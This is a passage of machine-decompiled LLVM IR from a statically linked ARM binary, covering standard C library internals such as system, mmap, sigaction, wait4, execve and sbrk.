  %v1_18ab8 = load i32, i32* %r5.global-to-local, align 4
  %v3_18ab8 = icmp ult i32 %v1_18ab4, %v1_18ab8
  %v9_18ab8 = icmp eq i32 %v1_18ab4, %v1_18ab8
  store i1 %v9_18ab8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18ab8, label %dec_label_pc_18aa8, label %dec_label_pc_18ae8.lr.ph

dec_label_pc_18ae8.lr.ph:                         ; preds = %dec_label_pc_18aa8, %bb65
  %v2_18ac0 = icmp eq i32 %v0_1891c, 0
  store i1 %v2_18ac0, i1* %cpsr_z.global-to-local, align 1
  %v2_18ac8 = xor i1 %v2_18ac0, true
  call void @__pseudo_cond_branch(i1 %v2_18ac8, i32 %v0_1891c)
  store i32 -32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_18adc = load i32, i32* @r6, align 4
  %v2_18adc = add i32 %v0_18adc, -32
  store i32 %v2_18adc, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18ae8

dec_label_pc_18ae8:                               ; preds = %dec_label_pc_18ae8.dec_label_pc_18ae8_crit_edge, %dec_label_pc_18ae8.lr.ph
  %v1_18ae8 = phi i32 [ %v1_18af4, %dec_label_pc_18ae8.dec_label_pc_18ae8_crit_edge ], [ 0, %dec_label_pc_18ae8.lr.ph ]
  %v0_18ae8 = phi i32 [ %v0_18ae8.pre, %dec_label_pc_18ae8.dec_label_pc_18ae8_crit_edge ], [ %v2_18adc, %dec_label_pc_18ae8.lr.ph ]
  %v4_18ae8 = mul i32 %v1_18ae8, 4
  %v5_18ae8 = add i32 %v4_18ae8, %v0_18ae8
  %v6_18ae8 = inttoptr i32 %v5_18ae8 to i32*
  %v7_18ae8 = load i32, i32* %v6_18ae8, align 4
  store i32 %v7_18ae8, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_18ae8)
  %v0_18af4 = load i32, i32* %r4.global-to-local, align 4
  %v1_18af4 = add i32 %v0_18af4, 1
  store i32 %v1_18af4, i32* %r4.global-to-local, align 4
  %v1_18af8 = load i32, i32* %r5.global-to-local, align 4
  %v3_18af8 = icmp ult i32 %v1_18af4, %v1_18af8
  %v9_18af8 = icmp eq i32 %v1_18af4, %v1_18af8
  store i1 %v9_18af8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18af8, label %dec_label_pc_18ae8.dec_label_pc_18ae8_crit_edge, label %dec_label_pc_18b00

dec_label_pc_18ae8.dec_label_pc_18ae8_crit_edge:  ; preds = %dec_label_pc_18ae8
  %v0_18ae8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_18ae8

dec_label_pc_18b00:                               ; preds = %dec_label_pc_18ae8
  %v0_18b04.pre = load i32, i32* @r6, align 4
  store i32 116, i32* %r3.global-to-local, align 4
  %v2_18b04 = add i32 %v0_18b04.pre, 116
  %v3_18b04 = inttoptr i32 %v2_18b04 to i32*
  %v4_18b04 = load i32, i32* %v3_18b04, align 4
  store i32 %v4_18b04, i32* %r2.global-to-local, align 4
  store i32 %v4_18b04, i32* %r3.global-to-local, align 4
  %v2_18b0c = icmp eq i32 %v4_18b04, 0
  store i1 %v2_18b0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b0c, label %dec_label_pc_18b24, label %dec_label_pc_18b14

dec_label_pc_18b14:                               ; preds = %dec_label_pc_18b00
  call void @__pseudo_branch(i32 %v4_18b04)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_18b20 = load i32, i32* @r0, align 4
  %v2_18b20 = inttoptr i32 %v1_18b20 to i32*
  store i32 0, i32* %v2_18b20, align 4
  %v0_18b28.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_18b24

dec_label_pc_18b24:                               ; preds = %dec_label_pc_18b00, %dec_label_pc_18b14
  %v0_18b28 = phi i32 [ %v0_18b04.pre, %dec_label_pc_18b00 ], [ %v0_18b28.pre, %dec_label_pc_18b14 ]
  store i32 88, i32* %r3.global-to-local, align 4
  %v2_18b28 = add i32 %v0_18b28, 88
  %v3_18b28 = inttoptr i32 %v2_18b28 to i32*
  %v4_18b28 = load i32, i32* %v3_18b28, align 4
  store i32 %v4_18b28, i32* %r2.global-to-local, align 4
  store i32 %v4_18b28, i32* %r3.global-to-local, align 4
  %v2_18b30 = icmp eq i32 %v4_18b28, 0
  store i1 %v2_18b30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b30, label %dec_label_pc_18b48, label %dec_label_pc_18b38

dec_label_pc_18b38:                               ; preds = %dec_label_pc_18b24
  call void @__pseudo_branch(i32 %v4_18b28)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_18b44 = load i32, i32* @r0, align 4
  %v2_18b44 = inttoptr i32 %v1_18b44 to i32*
  store i32 0, i32* %v2_18b44, align 4
  %v0_18b4c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_18b48

dec_label_pc_18b48:                               ; preds = %dec_label_pc_18b24, %dec_label_pc_18b38
  %v0_18b4c = phi i32 [ %v0_18b28, %dec_label_pc_18b24 ], [ %v0_18b4c.pre, %dec_label_pc_18b38 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v2_18b4c = add i32 %v0_18b4c, 32
  %v3_18b4c = inttoptr i32 %v2_18b4c to i32*
  %v4_18b4c = load i32, i32* %v3_18b4c, align 4
  store i32 %v4_18b4c, i32* %r3.global-to-local, align 4
  %v1_18b54 = inttoptr i32 %v4_18b4c to i32*
  %v2_18b54 = load i32, i32* %v1_18b54, align 4
  store i32 %v2_18b54, i32* %r2.global-to-local, align 4
  %v0_18b58 = load i32, i32* %sb.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_18b64 = call i32 @__GI_exit(i32 %v0_18b58)
  %v0_18b68 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18b68, label %bb66, label %.thread8

bb66:                                             ; preds = %dec_label_pc_18b48
  %v1_18b68 = load i32, i32* @r1, align 4
  %v2_18b68 = load i32, i32* %r4.global-to-local, align 4
  %v3_18b68 = load i32, i32* @r7, align 4
  %v8_18b68 = lshr i32 %v2_18b68, %v3_18b68
  %v9_18b68 = and i32 %v8_18b68, %v1_18b68
  store i32 %v9_18b68, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_18b48, %bb66
  %v4_18b88 = phi i32 [ %v1_18b64, %dec_label_pc_18b48 ], [ 0, %bb66 ]
  ret i32 %v4_18b88

; uselistorder directives
  uselistorder i32 %v0_18b04.pre, { 1, 0 }
  uselistorder i32 %v1_18af8, { 1, 0 }
  uselistorder i32 %v1_18af4, { 3, 2, 1, 0 }
  uselistorder i32 %v1_18ab8, { 1, 0 }
  uselistorder i32 %v1_18ab4, { 1, 2, 3, 0 }
  uselistorder i32 %v4_18a6c, { 1, 0, 2 }
  uselistorder i1 %v8_189b4, { 1, 2, 0 }
  uselistorder i32 %v2_18984, { 1, 2, 0 }
  uselistorder i1 %v2_1896c, { 1, 0 }
  uselistorder i32 %v4_18950, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v0_1891c, { 1, 0 }
  uselistorder i32 %v3_188ec, { 1, 0 }
  uselistorder i32 %tmp53, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp52, { 1, 0 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 4, 5, 2, 1, 3, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 3, 5, 4, 0, 7, 6, 1, 2, 11, 8, 9, 10, 12 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 18, 11, 12, 13, 14, 15, 16, 17, 21, 22, 2, 23, 19, 20, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 13, 14, 1, 10, 11, 12, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 6, 0, 10, 7, 1, 8, 9, 12, 13, 14, 15, 16, 17, 18, 20, 19, 2, 11 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 47, { 0, 2, 1 }
  uselistorder i32 124, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_18b48, { 1, 0 }
  uselistorder label %dec_label_pc_18b24, { 1, 0 }
  uselistorder label %bb65, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18a34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18a10, { 3, 0, 1, 2 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %dec_label_pc_18984, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %dec_label_pc_1896c, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18ba8 = load i32, i32* @r4, align 4
  %v0_18bb4 = load i32, i32* %r0.global-to-local, align 4
  %v2_18bb4 = icmp eq i32 %v0_18bb4, 0
  br i1 %v2_18bb4, label %bb, label %dec_label_pc_18bcc

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18ce8

dec_label_pc_18bcc:                               ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_18bd4 = call i32 @bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_18be4 = call i32 @bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_18bf4 = call i32 @bsd_signal(i32 17, i32 0)
  store i32 %v2_18bf4, i32* @r0, align 4
  %v0_18bfc = call i32 @__vfork()
  store i32 %v0_18bfc, i32* %r0.global-to-local, align 4
  store i32 %v0_18bfc, i32* @r4, align 4
  %v1_18c00 = icmp slt i32 %v0_18bfc, 0
  br i1 %v1_18c00, label %dec_label_pc_18c08, label %dec_label_pc_18c34

dec_label_pc_18c08:                               ; preds = %dec_label_pc_18bcc
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_18c10 = call i32 @bsd_signal(i32 3, i32 %v2_18bd4)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_18c1c = call i32 @bsd_signal(i32 2, i32 %v2_18be4)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_18c28 = call i32 @bsd_signal(i32 17, i32 %v2_18bf4)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18ce8

dec_label_pc_18c34:                               ; preds = %dec_label_pc_18bcc
  %v2_18c00 = icmp eq i32 %v0_18bfc, 0
  br i1 %v2_18c00, label %dec_label_pc_18c38, label %dec_label_pc_18c8c

dec_label_pc_18c38:                               ; preds = %dec_label_pc_18c34
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_18c40 = call i32 @bsd_signal(i32 3, i32 0)
  %v0_18c44 = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_18c4c = call i32 @bsd_signal(i32 2, i32 %v0_18c44)
  %v0_18c50 = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_18c58 = call i32 @bsd_signal(i32 17, i32 %v0_18c50)
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34288), i32* %r0.global-to-local, align 4
  %v0_18c7c = load i32, i32* @r4, align 4
  %v5_18c80 = call i32 @execl(i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34288), i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34280), i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34276), i32 %v0_18bb4, i32 %v0_18c7c)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_18c88 = call i32 @__GI__exit(i32 127)
  store i32 %v1_18c88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c8c

dec_label_pc_18c8c:                               ; preds = %dec_label_pc_18c34, %dec_label_pc_18c38
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_18c94 = call i32 @bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_18ca0 = call i32 @bsd_signal(i32 2, i32 1)
  %v2_18cac = ptrtoint i32* %stack_var_-12 to i32
  %v0_18cb0 = load i32, i32* @r4, align 4
  store i32 %v0_18cb0, i32* %r0.global-to-local, align 4
  %v2_18cb4 = call i32 @wait4(i32 %v0_18cb0, i32 %v2_18cac)
  store i32 %v2_18cb4, i32* %r0.global-to-local, align 4
  %v7_18cb8 = icmp eq i32 %v2_18cb4, -1
  br i1 %v7_18cb8, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_18c8c
  store i32 %v2_18cb4, i32* %stack_var_-12, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_18c8c, %bb11
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_18cc8 = call i32 @bsd_signal(i32 3, i32 %v2_18bd4)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_18cd4 = call i32 @bsd_signal(i32 2, i32 %v2_18be4)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_18ce0 = call i32 @bsd_signal(i32 17, i32 %v2_18bf4)
  %v3_18ce4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_18ce4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18ce8

dec_label_pc_18ce8:                               ; preds = %bb, %dec_label_pc_18c08, %bb12
  %v1_18cf0 = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_18c08 ], [ %v3_18ce4, %bb12 ]
  store i32 %v3_18ba8, i32* @r4, align 4
  ret i32 %v1_18cf0

; uselistorder directives
  uselistorder i32 %v2_18cb4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 12, 11, 13, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 0, 1 }
  uselistorder i32 (i32, i32)* @wait4, { 1, 0 }
  uselistorder i32 (i32)* @__GI__exit, { 4, 0, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34288), { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_18ce8, { 2, 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %dec_label_pc_18c8c, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18d04 = load i32, i32* @r4, align 4
  store i32 %v3_18d04, i32* %stack_var_-16, align 4
  %v3_18d10 = urem i32 %arg3, 4096
  %v2_18d14 = icmp eq i32 %v3_18d10, 0
  br i1 %v2_18d14, label %dec_label_pc_18d30, label %dec_label_pc_18d1c

dec_label_pc_18d1c:                               ; preds = %entry
  %v0_18d1c = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_18d28 = inttoptr i32 %v0_18d1c to i32*
  store i32 22, i32* %v2_18d28, align 4
  %v0_18d60.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18d60

dec_label_pc_18d30:                               ; preds = %entry
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_18d5c, label %dec_label_pc_18d4c

dec_label_pc_18d4c:                               ; preds = %dec_label_pc_18d30
  %v0_18d4c = call i32 @__GI___errno_location()
  %v0_18d50 = load i32, i32* %r4.global-to-local, align 4
  %v1_18d50 = sub i32 0, %v0_18d50
  %v2_18d54 = inttoptr i32 %v0_18d4c to i32*
  store i32 %v1_18d50, i32* %v2_18d54, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18d5c

dec_label_pc_18d5c:                               ; preds = %dec_label_pc_18d30, %dec_label_pc_18d4c
  %v0_18d5c = phi i32 [ %arg1, %dec_label_pc_18d30 ], [ -1, %dec_label_pc_18d4c ]
  store i32 %v0_18d5c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18d60

dec_label_pc_18d60:                               ; preds = %dec_label_pc_18d1c, %dec_label_pc_18d5c
  %v0_18d60 = phi i32 [ %v0_18d60.pre, %dec_label_pc_18d1c ], [ %v0_18d5c, %dec_label_pc_18d5c ]
  %v2_18d64 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18d64, i32* @r4, align 4
  ret i32 %v0_18d60

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18d60, { 1, 0 }
  uselistorder label %dec_label_pc_18d5c, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_18d6c = load i32, i32* @r4, align 4
  store i32 %v3_18d6c, i32* %stack_var_-8, align 4
  %v0_18d70 = load i32, i32* @r0, align 4
  %v0_18d74 = call i32 @__GI___errno_location()
  %v1_18d78 = sub i32 0, %v0_18d70
  %v2_18d7c = inttoptr i32 %v0_18d74 to i32*
  store i32 %v1_18d78, i32* %v2_18d7c, align 4
  %v2_18d84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18d84, i32* @r4, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_18d8c = load i32, i32* @r4, align 4
  %v6_18d8c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_18d94 = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_18d94, label %dec_label_pc_18de8, label %dec_label_pc_18dac

dec_label_pc_18dac:                               ; preds = %entry
  %v1_18dac = add i32 %arg2, 4
  %v2_18dac = inttoptr i32 %v1_18dac to i32*
  %v3_18dac = load i32, i32* %v2_18dac, align 4
  store i32 %v3_18dac, i32* @r3, align 4
  %v1_18db0 = and i32 %v3_18dac, 67108864
  %v2_18db0 = icmp eq i32 %v1_18db0, 0
  br i1 %v2_18db0, label %dec_label_pc_18db8, label %dec_label_pc_18de8

dec_label_pc_18db8:                               ; preds = %dec_label_pc_18dac
  store i32 20, i32* @r2, align 4
  %v2_18dbc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_18dbc, i32* @r0, align 4
  %v0_18dc0 = call i32 @memcpy()
  %v0_18de8.pre = load i32, i32* @r5, align 4
  %v0_18df0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18de8

dec_label_pc_18de8:                               ; preds = %dec_label_pc_18dac, %entry, %dec_label_pc_18db8
  %v0_18df0 = phi i32 [ %arg3, %dec_label_pc_18dac ], [ %arg3, %entry ], [ %v0_18df0.pre, %dec_label_pc_18db8 ]
  %v0_18dec = phi i32 [ %arg2, %dec_label_pc_18dac ], [ 0, %entry ], [ %v2_18dbc, %dec_label_pc_18db8 ]
  %v0_18de8 = phi i32 [ %arg1, %dec_label_pc_18dac ], [ %arg1, %entry ], [ %v0_18de8.pre, %dec_label_pc_18db8 ]
  %v4_18df8 = call i32 @__syscall_rt_sigaction(i32 %v0_18de8, i32 %v0_18dec, i32 %v0_18df0, i32 8)
  store i32 %v3_18d8c, i32* @r4, align 4
  store i32 %v6_18d8c, i32* @r5, align 4
  ret i32 %v4_18df8

; uselistorder directives
  uselistorder label %dec_label_pc_18de8, { 2, 0, 1 }
}

define i32 @function_18e0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_18e0c:
  %v0_18e0c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18e0c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18e0c
  %v2_18e0c = load i32, i32* @ip, align 4
  %v8_18e0c = ashr i32 %v2_18e0c, %arg1
  %v9_18e0c = and i32 %v8_18e0c, %arg1
  %v2_18e10 = load i32, i32* @r4, align 4
  %v8_18e10 = ashr i32 %v2_18e10, %v9_18e0c
  %v9_18e10 = and i32 %v8_18e10, %v9_18e0c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18e0c, %bb
  %v0_18e14 = phi i32 [ %arg1, %dec_label_pc_18e0c ], [ %v9_18e10, %bb ]
  ret i32 %v0_18e14

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer() local_unnamed_addr {
entry:
  %v0_18e28 = load i32, i32* @r0, align 4
  ret i32 %v0_18e28
}

define i32 @wait4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18e2c = load i32, i32* @r7, align 4
  store i32 %v3_18e2c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_18e54, label %dec_label_pc_18e44

dec_label_pc_18e44:                               ; preds = %entry
  %v0_18e44 = call i32 @__GI___errno_location()
  %v0_18e48 = load i32, i32* %r7.global-to-local, align 4
  %v1_18e48 = sub i32 0, %v0_18e48
  %v2_18e4c = inttoptr i32 %v0_18e44 to i32*
  store i32 %v1_18e48, i32* %v2_18e4c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_18e58.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18e54

dec_label_pc_18e54:                               ; preds = %entry, %dec_label_pc_18e44
  %v2_18e58 = phi i32 [ %v3_18e2c, %entry ], [ %v2_18e58.pre, %dec_label_pc_18e44 ]
  %v0_18e54 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_18e44 ]
  store i32 %v2_18e58, i32* @r7, align 4
  ret i32 %v0_18e54

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18e54, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18e60 = load i32, i32* @r7, align 4
  store i32 %v3_18e60, i32* %stack_var_-8, align 4
  %v0_18e6c = load i32, i32* @r0, align 4
  store i32 %v0_18e6c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_18e6c, -4095
  br i1 %tmp, label %dec_label_pc_18e8c, label %dec_label_pc_18e7c

dec_label_pc_18e7c:                               ; preds = %entry
  %v0_18e7c = call i32 @__GI___errno_location()
  %v0_18e80 = load i32, i32* %r7.global-to-local, align 4
  %v1_18e80 = sub i32 0, %v0_18e80
  %v2_18e84 = inttoptr i32 %v0_18e7c to i32*
  store i32 %v1_18e80, i32* %v2_18e84, align 4
  %v2_18e8c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18e8c

dec_label_pc_18e8c:                               ; preds = %entry, %dec_label_pc_18e7c
  %v1_18e90 = phi i32 [ %v0_18e6c, %entry ], [ -1, %dec_label_pc_18e7c ]
  %v2_18e8c = phi i32 [ %v3_18e60, %entry ], [ %v2_18e8c.pre, %dec_label_pc_18e7c ]
  store i32 %v2_18e8c, i32* %r7.global-to-local, align 4
  ret i32 %v1_18e90

; uselistorder directives
  uselistorder i32 %v0_18e6c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18e8c, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_18ea0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 104) to i32*), align 4
  %v1_18ea4 = inttoptr i32 %v4_18ea0 to i32*
  %v2_18ea4 = load i32, i32* %v1_18ea4, align 4
  %v2_18ea8 = icmp eq i32 %v2_18ea4, 0
  br i1 %v2_18ea8, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_18eb0 = phi i32 [ %v2_18ea4, %entry ], [ 4096, %bb ]
  ret i32 %v1_18eb0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_18ecc = load i32, i32* @r0, align 4
  ret i32 %v1_18ecc
}

define i32 @__GI_clock_getres(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18ed0 = load i32, i32* @r7, align 4
  store i32 %v3_18ed0, i32* %stack_var_-8, align 4
  %v0_18edc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18edc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_18edc, -4095
  br i1 %tmp, label %dec_label_pc_18efc, label %dec_label_pc_18eec

dec_label_pc_18eec:                               ; preds = %entry
  %v0_18eec = call i32 @__GI___errno_location()
  %v0_18ef0 = load i32, i32* %r7.global-to-local, align 4
  %v1_18ef0 = sub i32 0, %v0_18ef0
  %v2_18ef4 = inttoptr i32 %v0_18eec to i32*
  store i32 %v1_18ef0, i32* %v2_18ef4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_18efc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18efc

dec_label_pc_18efc:                               ; preds = %entry, %dec_label_pc_18eec
  %v1_18f00 = phi i32 [ %v0_18edc, %entry ], [ -1, %dec_label_pc_18eec ]
  %v2_18efc = phi i32 [ %v3_18ed0, %entry ], [ %v2_18efc.pre, %dec_label_pc_18eec ]
  store i32 %v2_18efc, i32* %r7.global-to-local, align 4
  ret i32 %v1_18f00

; uselistorder directives
  uselistorder i32 %v0_18edc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18efc, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18f04 = load i32, i32* @r7, align 4
  store i32 %v3_18f04, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_18f2c, label %dec_label_pc_18f1c

dec_label_pc_18f1c:                               ; preds = %entry
  %v0_18f1c = call i32 @__GI___errno_location()
  %v0_18f20 = load i32, i32* %r7.global-to-local, align 4
  %v1_18f20 = sub i32 0, %v0_18f20
  %v2_18f24 = inttoptr i32 %v0_18f1c to i32*
  store i32 %v1_18f20, i32* %v2_18f24, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_18f30.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18f2c

dec_label_pc_18f2c:                               ; preds = %entry, %dec_label_pc_18f1c
  %v2_18f30 = phi i32 [ %v3_18f04, %entry ], [ %v2_18f30.pre, %dec_label_pc_18f1c ]
  %v0_18f2c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_18f1c ]
  store i32 %v2_18f30, i32* @r7, align 4
  ret i32 %v0_18f2c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18f2c, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_18f48 = load i32, i32* @r0, align 4
  ret i32 %v1_18f48
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18f4c = load i32, i32* @r4, align 4
  store i32 %v3_18f4c, i32* %stack_var_-16, align 4
  store i32 26356, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r4.global-to-local, align 4
  %v4_18f5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 26356) to i32*), align 4
  %v2_18f60 = icmp eq i32 %v4_18f5c, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
